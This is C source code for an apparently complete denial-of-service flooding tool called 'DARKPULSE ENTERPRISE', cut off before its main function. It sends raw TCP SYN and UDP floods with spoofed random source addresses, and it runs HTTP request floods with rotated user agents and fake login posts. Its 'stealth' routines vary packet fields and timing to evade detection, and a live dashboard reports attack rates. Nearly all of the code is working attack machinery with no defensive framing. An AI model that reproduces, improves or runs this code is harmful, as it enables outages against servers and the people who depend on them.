#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdarg.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <netdb.h>
#include <sys/resource.h>
#include <curl/curl.h>

#define MAX_THREADS 200
#define PACKET_SIZE 4096
#define MAX_RATE 1000
#define STEALTH_INTERVAL 30
#define CHECKSUM_BUFFER_SIZE 1500

// ==================== GLOBAL VARIABLES ====================

volatile sig_atomic_t running = 1;
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t curl_mutex = PTHREAD_MUTEX_INITIALIZER;
FILE *global_log_file = NULL;
int curl_initialized = 0;

// ==================== STRUCTURES ====================

typedef struct {
    char target_ip[INET6_ADDRSTRLEN];
    char target_ipv4[INET_ADDRSTRLEN];
    int ip_version; // 4 or 6
    int target_port;
    int thread_id;
    volatile sig_atomic_t *running;
    
    // Statistics (protected by mutex for thread safety)
    unsigned long packets_sent;
    unsigned long http_requests;
    unsigned long errors;
    unsigned long successful_packets;
    unsigned long successful_http;
    
    // Attack configuration
    int attack_type;
    int intensity;
    int duration;
    int stealth_level;
    int spoof_ip;
    
    // Technical
    int tcp_socket_fd;
    int udp_socket_fd;
    int icmp_socket_fd;
    CURL *curl_handle;
    unsigned int seed;
    time_t attack_start;
    time_t last_pattern_change;
    
    // Stealth features
    int current_ttl;
    int current_window;
    int current_mss;
    int attack_pattern;
    
    // Thread-local checksum buffer (avoid malloc per packet)
    char checksum_buffer[CHECKSUM_BUFFER_SIZE];
} attack_config_t;

typedef struct {
    attack_config_t *configs;
    int num_threads;
    volatile sig_atomic_t *running;
    time_t start_time;
} monitor_data_t;

// ==================== FUNCTION DECLARATIONS ====================

// Utility functions
unsigned int secure_rand(attack_config_t *config);
void secure_log(FILE *log_file, const char *level, const char *format, ...);

// Stealth functions
void generate_stealth_ip(char *ip_buffer, attack_config_t *config);
void change_attack_pattern(attack_config_t *config);
void simulate_human_behavior(attack_config_t *config);

// Packet functions
unsigned short calculate_checksum(unsigned short *buf, int len);
unsigned short calculate_tcp_checksum_ipv4(struct iphdr *ip, struct tcphdr *tcp, int tcp_len, char *buffer);
int build_tcp_packet_ipv4(attack_config_t *config, char *packet, const char *src_ip, int flags);
int build_udp_packet_ipv4(attack_config_t *config, char *packet, const char *src_ip);
int create_raw_socket(int protocol);
int send_tcp_packet(attack_config_t *config);
int send_udp_packet(attack_config_t *config);
void close_sockets(attack_config_t *config);

// HTTP functions
size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata);
int execute_http_attack(attack_config_t *config);
void init_curl_global();
void cleanup_curl_global();

// Thread-safe counter functions
void increment_packets_sent(attack_config_t *config);
void increment_http_requests(attack_config_t *config);
void increment_errors(attack_config_t *config);
void increment_successful_packets(attack_config_t *config);
void increment_successful_http(attack_config_t *config);

// Attack threads
void *tcp_attack_thread(void *arg);
void *udp_attack_thread(void *arg);
void *http_attack_thread(void *arg);
void *mixed_attack_thread(void *arg);

// Monitoring
void display_real_time_stats(attack_config_t *configs, int num_threads, time_t start_time);
void *monitor_thread_func(void *arg);

// Validation and utils
int validate_target(const char *target, char *ip_buffer, size_t buffer_size, int *ip_version);
int check_system_limits(int required_threads);
void signal_handler(int sig);
void print_banner();
void print_usage();

// ==================== UTILITY FUNCTIONS ====================

unsigned int secure_rand(attack_config_t *config) {
    unsigned int result = 0;
    int fd = open("/dev/urandom", O_RDONLY);
    
    if (fd >= 0) {
        if (read(fd, &result, sizeof(result)) == sizeof(result)) {
            close(fd);
            return result;
        }
        close(fd);
    }
    
    // Fallback deterministic PRNG
    config->seed = (config->seed * 1103515245 + 12345) & 0x7FFFFFFF;
    return config->seed;
}

void secure_log(FILE *log_file, const char *level, const char *format, ...) {
    if (!log_file) return;
    
    char log_buffer[1024];
    char time_buffer[64];
    va_list args;
    struct timeval tv;
    struct tm *tm_info;
    
    gettimeofday(&tv, NULL);
    tm_info = localtime(&tv.tv_sec);
    strftime(time_buffer, sizeof(time_buffer), "%Y-%m-%d %H:%M:%S", tm_info);
    
    va_start(args, format);
    int written = vsnprintf(log_buffer, sizeof(log_buffer) - 1, format, args);
    va_end(args);
    
    if (written >= 0 && written < (int)sizeof(log_buffer)) {
        log_buffer[written] = '\0';
    } else {
        log_buffer[sizeof(log_buffer) - 1] = '\0';
    }
    
    pthread_mutex_lock(&stats_mutex);
    #ifdef __APPLE__
        fprintf(log_file, "[%s.%06d] [%s] %s\n", time_buffer, (int)tv.tv_usec, level, log_buffer);
    #else
        fprintf(log_file, "[%s.%06ld] [%s] %s\n", time_buffer, (long)tv.tv_usec, level, log_buffer);
    #endif
    fflush(log_file);
    pthread_mutex_unlock(&stats_mutex);
}

// ==================== THREAD-SAFE COUNTER FUNCTIONS ====================

void increment_packets_sent(attack_config_t *config) {
    pthread_mutex_lock(&stats_mutex);
    config->packets_sent++;
    pthread_mutex_unlock(&stats_mutex);
}

void increment_http_requests(attack_config_t *config) {
    pthread_mutex_lock(&stats_mutex);
    config->http_requests++;
    pthread_mutex_unlock(&stats_mutex);
}

void increment_errors(attack_config_t *config) {
    pthread_mutex_lock(&stats_mutex);
    config->errors++;
    pthread_mutex_unlock(&stats_mutex);
}

void increment_successful_packets(attack_config_t *config) {
    pthread_mutex_lock(&stats_mutex);
    config->successful_packets++;
    pthread_mutex_unlock(&stats_mutex);
}

void increment_successful_http(attack_config_t *config) {
    pthread_mutex_lock(&stats_mutex);
    config->successful_http++;
    pthread_mutex_unlock(&stats_mutex);
}

// ==================== CHECKSUM CALCULATIONS (OPTIMIZED) ====================

unsigned short calculate_checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return (unsigned short)~sum;
}

unsigned short calculate_tcp_checksum_ipv4(struct iphdr *ip, struct tcphdr *tcp, int tcp_len, char *buffer) {
    struct pseudo_header {
        uint32_t source_address;
        uint32_t dest_address;
        uint8_t zero;
        uint8_t protocol;
        uint16_t tcp_length;
    } __attribute__((packed)) pheader;
    
    // Use pre-allocated buffer instead of malloc
    char *pseudogram = buffer;
    int total_len = sizeof(pheader) + tcp_len;
    
    if (total_len > CHECKSUM_BUFFER_SIZE) {
        return 0; // Should never happen with reasonable packet sizes
    }
    
    // Fill pseudo header with proper packing
    pheader.source_address = ip->saddr;
    pheader.dest_address = ip->daddr;
    pheader.zero = 0;
    pheader.protocol = IPPROTO_TCP;
    pheader.tcp_length = htons(tcp_len);
    
    // Copy to buffer
    memcpy(pseudogram, &pheader, sizeof(pheader));
    memcpy(pseudogram + sizeof(pheader), tcp, tcp_len);
    
    return calculate_checksum((unsigned short*)pseudogram, total_len);
}

// ==================== STEALTH FUNCTIONS ====================

void generate_stealth_ip(char *ip_buffer, attack_config_t *config) {
    int attempts = 0;
    
    while (attempts < 20) { // Reduced attempts for performance
        int octet1 = 1 + (secure_rand(config) % 223);
        int octet2 = secure_rand(config) % 256;
        int octet3 = secure_rand(config) % 256;
        int octet4 = 1 + (secure_rand(config) % 254);
        
        // Basic private IP filtering only (for performance)
        if (octet1 == 10) continue;
        if (octet1 == 172 && octet2 >= 16 && octet2 <= 31) continue;
        if (octet1 == 192 && octet2 == 168) continue;
        if (octet1 >= 224) continue;
        
        snprintf(ip_buffer, 16, "%d.%d.%d.%d", octet1, octet2, octet3, octet4);
        return;
    }
    
    // Simple fallback
    const char* fallbacks[] = {"8.8.8.8", "1.1.1.1", "9.9.9.9"};
    strncpy(ip_buffer, fallbacks[secure_rand(config) % 3], 15);
    ip_buffer[15] = '\0';
}

void change_attack_pattern(attack_config_t *config) {
    time_t current_time = time(NULL);
    if (current_time - config->last_pattern_change > STEALTH_INTERVAL) {
        config->current_ttl = 30 + (secure_rand(config) % 50);
        int window_sizes[] = {5840, 8192, 16384, 29200, 4380, 65535};
        config->current_window = window_sizes[secure_rand(config) % 6];
        int mss_values[] = {536, 1460, 1440, 1452, 1420};
        config->current_mss = mss_values[secure_rand(config) % 5];
        config->attack_pattern = (config->attack_pattern + 1) % 4;
        config->last_pattern_change = current_time;
    }
}

void simulate_human_behavior(attack_config_t *config) {
    if (secure_rand(config) % 100 < config->stealth_level) {
        usleep(1000 + (secure_rand(config) % 20000)); // 1-20ms delay
    }
}

// ==================== PACKET FUNCTIONS (OPTIMIZED) ====================

int build_tcp_packet_ipv4(attack_config_t *config, char *packet, const char *src_ip, int flags) {
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    memset(packet, 0, sizeof(struct iphdr) + sizeof(struct tcphdr));
    
    // IP Header
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = secure_rand(config) % 16;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip->id = htons(secure_rand(config) % 0xFFFF);
    ip->frag_off = htons(0x4000); // Don't fragment
    ip->ttl = config->current_ttl;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    
    if (inet_pton(AF_INET, src_ip, &ip->saddr) != 1) {
        return -1;
    }
    
    if (inet_pton(AF_INET, config->target_ipv4, &ip->daddr) != 1) {
        return -1;
    }
    
    ip->check = calculate_checksum((unsigned short *)ip, sizeof(struct iphdr));
    
    // TCP Header
    tcp->source = htons(49152 + (secure_rand(config) % 16384));
    tcp->dest = htons(config->target_port);
    tcp->seq = htonl(secure_rand(config));
    tcp->ack_seq = (flags & 0x10) ? htonl(secure_rand(config)) : 0;
    tcp->doff = 5;
    tcp->window = htons(config->current_window);
    tcp->check = 0;
    tcp->urg_ptr = 0;
    
    tcp->syn = (flags & 0x02) ? 1 : 0;
    tcp->ack = (flags & 0x10) ? 1 : 0;
    tcp->rst = (flags & 0x04) ? 1 : 0;
    tcp->psh = (secure_rand(config) % 4 == 0) ? 1 : 0;
    tcp->urg = 0;
    tcp->fin = 0;
    
    // Use pre-allocated buffer for checksum calculation
    tcp->check = calculate_tcp_checksum_ipv4(ip, tcp, sizeof(struct tcphdr), config->checksum_buffer);
    
    return 0;
}

int build_udp_packet_ipv4(attack_config_t *config, char *packet, const char *src_ip) {
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    size_t packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + 64; // Reduced payload for performance
    
    if (packet_size > PACKET_SIZE) return -1;
    memset(packet, 0, packet_size);
    
    // IP Header
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = secure_rand(config) % 16;
    ip->tot_len = htons(packet_size);
    ip->id = htons(secure_rand(config) % 0xFFFF);
    ip->frag_off = htons(0x4000);
    ip->ttl = config->current_ttl;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    
    if (inet_pton(AF_INET, src_ip, &ip->saddr) != 1) {
        return -1;
    }
    
    if (inet_pton(AF_INET, config->target_ipv4, &ip->daddr) != 1) {
        return -1;
    }
    
    ip->check = calculate_checksum((unsigned short *)ip, sizeof(struct iphdr));
    
    // UDP Header
    udp->source = htons(49152 + (secure_rand(config) % 16384));
    udp->dest = htons(config->target_port);
    udp->len = htons(sizeof(struct udphdr) + 64);
    udp->check = 0; // UDP checksum optional
    
    // Minimal payload
    char *data = (char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
    for (int i = 0; i < 64; i++) {
        data[i] = secure_rand(config) % 256;
    }
    
    return 0;
}

int create_raw_socket(int protocol) {
    int sock = socket(AF_INET, SOCK_RAW, protocol);
    if (sock < 0) {
        return -1;
    }
    
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sock);
        return -1;
    }
    
    // Set buffer sizes for performance
    int buf_size = 1024 * 1024; // 1MB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    
    return sock;
}

void close_sockets(attack_config_t *config) {
    if (config->tcp_socket_fd >= 0) {
        close(config->tcp_socket_fd);
        config->tcp_socket_fd = -1;
    }
    if (config->udp_socket_fd >= 0) {
        close(config->udp_socket_fd);
        config->udp_socket_fd = -1;
    }
    if (config->icmp_socket_fd >= 0) {
        close(config->icmp_socket_fd);
        config->icmp_socket_fd = -1;
    }
}

int send_tcp_packet(attack_config_t *config) {
    if (!(*config->running) || config->tcp_socket_fd < 0) {
        return -1;
    }
    
    char packet[PACKET_SIZE];
    struct sockaddr_in dest_addr;
    char src_ip[16];
    
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(config->target_port);
    
    if (inet_pton(AF_INET, config->target_ipv4, &dest_addr.sin_addr) != 1) {
        increment_errors(config);
        return -1;
    }
    
    if (config->spoof_ip) {
        generate_stealth_ip(src_ip, config);
    } else {
        // Use a realistic source IP instead of hardcoded
        strncpy(src_ip, "192.168.1.100", sizeof(src_ip)-1);
        src_ip[sizeof(src_ip)-1] = '\0';
    }
    
    int flags = 0x02; // SYN
    if (secure_rand(config) % 4 == 0) { // Reduced frequency for performance
        flags |= 0x10; // ACK
    }
    
    if (build_tcp_packet_ipv4(config, packet, src_ip, flags) != 0) {
        increment_errors(config);
        return -1;
    }
    
    size_t packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
    ssize_t sent = sendto(config->tcp_socket_fd, packet, packet_size, MSG_DONTWAIT,
                         (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    
    if (sent > 0) {
        increment_packets_sent(config);
        increment_successful_packets(config);
        return 0;
    } else {
        if (errno != EAGAIN && errno != EWOULDBLOCK) {
            increment_errors(config);
        }
        return -1;
    }
}

int send_udp_packet(attack_config_t *config) {
    if (!(*config->running) || config->udp_socket_fd < 0) {
        return -1;
    }
    
    char packet[PACKET_SIZE];
    struct sockaddr_in dest_addr;
    char src_ip[16];
    
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(config->target_port);
    
    if (inet_pton(AF_INET, config->target_ipv4, &dest_addr.sin_addr) != 1) {
        increment_errors(config);
        return -1;
    }
    
    if (config->spoof_ip) {
        generate_stealth_ip(src_ip, config);
    } else {
        strncpy(src_ip, "192.168.1.100", sizeof(src_ip)-1);
        src_ip[sizeof(src_ip)-1] = '\0';
    }
    
    if (build_udp_packet_ipv4(config, packet, src_ip) != 0) {
        increment_errors(config);
        return -1;
    }
    
    size_t packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + 64;
    ssize_t sent = sendto(config->udp_socket_fd, packet, packet_size, MSG_DONTWAIT,
                         (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    
    if (sent > 0) {
        increment_packets_sent(config);
        increment_successful_packets(config);
        return 0;
    } else {
        if (errno != EAGAIN && errno != EWOULDBLOCK) {
            increment_errors(config);
        }
        return -1;
    }
}

// ==================== HTTP FUNCTIONS (IMPROVED) ====================

size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
    return size * nmemb;
}

void init_curl_global() {
    pthread_mutex_lock(&curl_mutex);
    if (!curl_initialized) {
        curl_global_init(CURL_GLOBAL_ALL);
        curl_initialized = 1;
    }
    pthread_mutex_unlock(&curl_mutex);
}

void cleanup_curl_global() {
    pthread_mutex_lock(&curl_mutex);
    if (curl_initialized) {
        curl_global_cleanup();
        curl_initialized = 0;
    }
    pthread_mutex_unlock(&curl_mutex);
}

char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
};

char *http_paths[] = {
    "/", "/api/v1/users", "/products", "/search", "/images/logo.png",
    "/admin", "/wp-admin", "/api/data", "/v2/endpoint", "/static/css/main.css",
    "/blog", "/contact", "/about", "/login", "/api/status"
};

char *http_methods[] = {"GET", "POST", "HEAD", "OPTIONS"};

char *http_headers[] = {
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language: en-US,en;q=0.5",
    "Accept-Encoding: gzip, deflate, br",
    "Connection: keep-alive",
    "Upgrade-Insecure-Requests: 1",
    "Cache-Control: max-age=0"
};

int execute_http_attack(attack_config_t *config) {
    if (!(*config->running)) {
        return -1;
    }
    
    if (!config->curl_handle) {
        config->curl_handle = curl_easy_init();
        if (!config->curl_handle) {
            increment_errors(config);
            return -1;
        }
    }
    
    CURL *curl = config->curl_handle;
    char url[512];
    char post_data[256];
    struct curl_slist *headers = NULL;
    CURLcode res;
    long response_code = 0;
    
    const char *protocol = (config->target_port == 443) ? "https" : "http";
    int path_index = secure_rand(config) % (sizeof(http_paths) / sizeof(http_paths[0]));
    
    // Use domain if available, otherwise IP
    const char *target_host = config->target_ip;
    
    snprintf(url, sizeof(url), "%s://%s:%d%s", protocol, target_host, 
             config->target_port, http_paths[path_index]);
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    
    int agent_index = secure_rand(config) % (sizeof(user_agents) / sizeof(user_agents[0]));
    curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agents[agent_index]);
    
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    
    // Add random headers for realism
    for (int i = 0; i < 3; i++) {
        int header_idx = secure_rand(config) % (sizeof(http_headers) / sizeof(http_headers[0]));
        headers = curl_slist_append(headers, http_headers[header_idx]);
    }
    
    // Only set NOBODY for HEAD requests
    int method_index = secure_rand(config) % (sizeof(http_methods) / sizeof(http_methods[0]));
    if (strcmp(http_methods[method_index], "HEAD") == 0) {
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    } else {
        curl_easy_setopt(curl, CURLOPT_NOBODY, 0L);
    }
    
    simulate_human_behavior(config);
    
    if (strcmp(http_methods[method_index], "POST") == 0) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        snprintf(post_data, sizeof(post_data), "username=user%d&password=pass%d&token=%08x", 
                secure_rand(config) % 1000, secure_rand(config) % 1000, secure_rand(config));
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
    }
    
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    
    res = curl_easy_perform(curl);
    
    if (res == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        increment_http_requests(config);
        
        if (response_code < 500) {
            increment_successful_http(config);
        } else {
            increment_errors(config); // Count server errors as errors
        }
    } else {
        increment_errors(config);
    }
    
    curl_slist_free_all(headers);
    return (res == CURLE_OK) ? 0 : -1;
}

// ==================== VALIDATION AND UTILS ====================

int validate_target(const char *target, char *ip_buffer, size_t buffer_size, int *ip_version) {
    struct addrinfo hints, *result, *rp;
    int ret;
    
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC; // Both IPv4 and IPv6
    hints.ai_socktype = SOCK_STREAM;
    
    ret = getaddrinfo(target, NULL, &hints, &result);
    if (ret != 0) {
        return 0;
    }
    
    // Use the first valid address
    for (rp = result; rp != NULL; rp = rp->ai_next) {
        if (rp->ai_family == AF_INET) {
            struct sockaddr_in *ipv4 = (struct sockaddr_in *)rp->ai_addr;
            inet_ntop(AF_INET, &(ipv4->sin_addr), ip_buffer, buffer_size);
            *ip_version = 4;
            freeaddrinfo(result);
            return 1;
        } else if (rp->ai_family == AF_INET6) {
            struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)rp->ai_addr;
            inet_ntop(AF_INET6, &(ipv6->sin6_addr), ip_buffer, buffer_size);
            *ip_version = 6;
            freeaddrinfo(result);
            return 1;
        }
    }
    
    freeaddrinfo(result);
    return 0;
}

int check_system_limits(int required_threads) {
    struct rlimit lim;
    
    // Check file descriptor limit
    if (getrlimit(RLIMIT_NOFILE, &lim) == 0) {
        int required_fds = required_threads * 3 + 10; // Sockets + safety margin
        if (lim.rlim_cur < required_fds) {
            printf("[-] Warning: File descriptor limit (%lu) may be too low for %d threads\n", 
                   lim.rlim_cur, required_threads);
            return 0;
        }
    }
    
    return 1;
}

void signal_handler(int sig) {
    printf("\n[!] Received signal %d - Stopping attack...\n", sig);
    running = 0;
}

// ==================== ATTACK THREADS (IMPROVED) ====================

void *tcp_attack_thread(void *arg) {
    attack_config_t *config = (attack_config_t *)arg;
    
    config->seed = (unsigned int)(time(NULL) ^ getpid() ^ config->thread_id);
    config->attack_start = time(NULL);
    config->last_pattern_change = time(NULL);
    
    // Initialize thread-local checksum buffer
    memset(config->checksum_buffer, 0, CHECKSUM_BUFFER_SIZE);
    
    config->tcp_socket_fd = create_raw_socket(IPPROTO_TCP);
    
    config->current_ttl = 64;
    config->current_window = 5840;
    config->attack_pattern = 0;
    
    if (config->tcp_socket_fd < 0) {
        secure_log(global_log_file, "ERROR", "TCP thread %d: Failed to create raw socket", config->thread_id);
        increment_errors(config);
        return NULL;
    }
    
    secure_log(global_log_file, "INFO", "TCP attack thread %d started", config->thread_id);
    
    time_t last_stats_log = time(NULL);
    unsigned long last_packets = 0;
    
    while (*config->running && (time(NULL) - config->attack_start < config->duration)) {
        change_attack_pattern(config);
        
        for (int i = 0; i < 10 && *config->running; i++) { // Send bursts for performance
            send_tcp_packet(config);
        }
        
        if (config->intensity > 0) {
            int delay = 1000000 / config->intensity;
            if (delay > 0) usleep(delay);
        }
        
        // Log stats every 30 seconds
        if (time(NULL) - last_stats_log >= 30) {
            pthread_mutex_lock(&stats_mutex);
            unsigned long current_packets = config->packets_sent;
            pthread_mutex_unlock(&stats_mutex);
            unsigned long delta = current_packets - last_packets;
            secure_log(global_log_file, "STATS", "TCP thread %d: %lu packets/sec", 
                      config->thread_id, delta / 30);
            last_stats_log = time(NULL);
            last_packets = current_packets;
        }
    }
    
    close_sockets(config);
    
    pthread_mutex_lock(&stats_mutex);
    unsigned long final_packets = config->packets_sent;
    pthread_mutex_unlock(&stats_mutex);
    
    secure_log(global_log_file, "INFO", "TCP thread %d finished - Packets: %lu", 
               config->thread_id, final_packets);
    
    return NULL;
}

void *udp_attack_thread(void *arg) {
    attack_config_t *config = (attack_config_t *)arg;
    
    config->seed = (unsigned int)(time(NULL) ^ getpid() ^ config->thread_id);
    config->attack_start = time(NULL);
    config->last_pattern_change = time(NULL);
    
    memset(config->checksum_buffer, 0, CHECKSUM_BUFFER_SIZE);
    
    config->udp_socket_fd = create_raw_socket(IPPROTO_UDP);
    
    config->current_ttl = 64;
    config->current_window = 5840;
    config->attack_pattern = 0;
    
    if (config->udp_socket_fd < 0) {
        secure_log(global_log_file, "ERROR", "UDP thread %d: Failed to create raw socket", config->thread_id);
        increment_errors(config);
        return NULL;
    }
    
    secure_log(global_log_file, "INFO", "UDP attack thread %d started", config->thread_id);
    
    while (*config->running && (time(NULL) - config->attack_start < config->duration)) {
        change_attack_pattern(config);
        
        for (int i = 0; i < 10 && *config->running; i++) {
            send_udp_packet(config);
        }
        
        if (config->intensity > 0) {
            int delay = 1000000 / config->intensity;
            if (delay > 0) usleep(delay);
        }
    }
    
    close_sockets(config);
    
    pthread_mutex_lock(&stats_mutex);
    unsigned long final_packets = config->packets_sent;
    pthread_mutex_unlock(&stats_mutex);
    
    secure_log(global_log_file, "INFO", "UDP thread %d finished - Packets: %lu", 
               config->thread_id, final_packets);
    
    return NULL;
}

void *http_attack_thread(void *arg) {
    attack_config_t *config = (attack_config_t *)arg;
    
    config->seed = (unsigned int)(time(NULL) ^ getpid() ^ config->thread_id);
    config->attack_start = time(NULL);
    
    init_curl_global(); // Safe global init
    
    config->curl_handle = curl_easy_init();
    if (!config->curl_handle) {
        secure_log(global_log_file, "ERROR", "HTTP thread %d: Failed to initialize CURL", config->thread_id);
        increment_errors(config);
        return NULL;
    }
    
    secure_log(global_log_file, "INFO", "HTTP attack thread %d started", config->thread_id);
    
    while (*config->running && (time(NULL) - config->attack_start < config->duration)) {
        execute_http_attack(config);
        
        if (config->intensity > 0) {
            int delay = 1000000 / (config->intensity / 2);
            if (delay > 0) usleep(delay);
        }
    }
    
    if (config->curl_handle) {
        curl_easy_cleanup(config->curl_handle);
        config->curl_handle = NULL;
    }
    
    pthread_mutex_lock(&stats_mutex);
    unsigned long final_requests = config->http_requests;
    pthread_mutex_unlock(&stats_mutex);
    
    secure_log(global_log_file, "INFO", "HTTP thread %d finished - Requests: %lu", 
               config->thread_id, final_requests);
    
    return NULL;
}

void *mixed_attack_thread(void *arg) {
    attack_config_t *config = (attack_config_t *)arg;
    
    config->seed = (unsigned int)(time(NULL) ^ getpid() ^ config->thread_id);
    config->attack_start = time(NULL);
    config->last_pattern_change = time(NULL);
    
    memset(config->checksum_buffer, 0, CHECKSUM_BUFFER_SIZE);
    
    config->tcp_socket_fd = create_raw_socket(IPPROTO_TCP);
    config->udp_socket_fd = create_raw_socket(IPPROTO_UDP);
    
    init_curl_global();
    config->curl_handle = curl_easy_init();
    
    config->current_ttl = 64;
    config->current_window = 5840;
    config->attack_pattern = 0;
    
    secure_log(global_log_file, "INFO", "Mixed attack thread %d started", config->thread_id);
    
    while (*config->running && (time(NULL) - config->attack_start < config->duration)) {
        change_attack_pattern(config);
        
        int attack_choice = secure_rand(config) % 3;
        switch (attack_choice) {
            case 0:
                if (config->tcp_socket_fd >= 0) {
                    send_tcp_packet(config);
                }
                break;
            case 1:
                if (config->udp_socket_fd >= 0) {
                    send_udp_packet(config);
                }
                break;
            case 2:
                if (config->curl_handle) {
                    execute_http_attack(config);
                }
                break;
        }
        
        if (config->intensity > 0) {
            int delay = 1000000 / config->intensity;
            if (delay > 0) usleep(delay);
        }
    }
    
    close_sockets(config);
    if (config->curl_handle) {
        curl_easy_cleanup(config->curl_handle);
        config->curl_handle = NULL;
    }
    
    pthread_mutex_lock(&stats_mutex);
    unsigned long final_packets = config->packets_sent;
    unsigned long final_http = config->http_requests;
    pthread_mutex_unlock(&stats_mutex);
    
    secure_log(global_log_file, "INFO", "Mixed thread %d finished - Packets: %lu, HTTP: %lu", 
               config->thread_id, final_packets, final_http);
    
    return NULL;
}

// ==================== MONITORING ====================

void display_real_time_stats(attack_config_t *configs, int num_threads, time_t start_time) {
    unsigned long total_packets = 0;
    unsigned long total_http = 0;
    unsigned long total_errors = 0;
    unsigned long total_success_packets = 0;
    unsigned long total_success_http = 0;
    int active_threads = 0;
    
    pthread_mutex_lock(&stats_mutex);
    for (int i = 0; i < num_threads; i++) {
        total_packets += configs[i].packets_sent;
        total_http += configs[i].http_requests;
        total_errors += configs[i].errors;
        total_success_packets += configs[i].successful_packets;
        total_success_http += configs[i].successful_http;
        if (configs[i].packets_sent > 0 || configs[i].http_requests > 0) active_threads++;
    }
    pthread_mutex_unlock(&stats_mutex);
    
    double elapsed = difftime(time(NULL), start_time);
    double pps = (elapsed > 0 && total_packets > 0) ? total_packets / elapsed : 0.0;
    double rps = (elapsed > 0 && total_http > 0) ? total_http / elapsed : 0.0;
    double packet_success_rate = total_packets > 0 ? (double)total_success_packets / total_packets * 100.0 : 0.0;
    double http_success_rate = total_http > 0 ? (double)total_success_http / total_http * 100.0 : 0.0;
    
    printf("\033[2J\033[H");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                DARKPULSE ENTERPRISE v1.0                   ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");
    
    printf("📊 LIVE ATTACK STATISTICS:\n");
    printf("   ┌─────────────────────────────────────────────────────────┐\n");
    printf("   │ Total Packets:   %10lu    Rate: %8.1f pps │\n", total_packets, pps);
    printf("   │ HTTP Requests:   %10lu    Rate: %8.1f rps │\n", total_http, rps);
    printf("   │ Packet Success:  %10.1f%%    HTTP Success: %6.1f%% │\n", packet_success_rate, http_success_rate);
    printf("   │ Active Threads:  %10d/%d    Errors: %10lu │\n", active_threads, num_threads, total_errors);
    printf("   │ Elapsed Time:    %10.0f seconds                     │\n", elapsed);
    printf("   └─────────────────────────────────────────────────────────┘\n\n");
    
    printf("🛡️  ENTERPRISE FEATURES:\n");
    printf("   • Thread-Safe Counters:  No Data Races\n");
    printf("   • Pre-allocated Buffers: Zero malloc/free per packet\n");
    printf("   • IPv4/IPv6 Support:     Dual Stack Ready\n");
    printf("   • System Limit Checks:   Resource Aware\n");
    printf("\n⏰ Press Ctrl+C to stop attack\n");
}

void *monitor_thread_func(void *arg) {
    monitor_data_t *data = (monitor_data_t *)arg;
    while (*data->running) {
        display_real_time_stats(data->configs, data->num_threads, data->start_time);
        for (int i = 0; i < 10 && *data->running; i++) usleep(100000);
    }
    free(data);
    return NULL;
}

// ==================== MAIN FUNCTION ====================

void print_banner() {
    printf("\n");
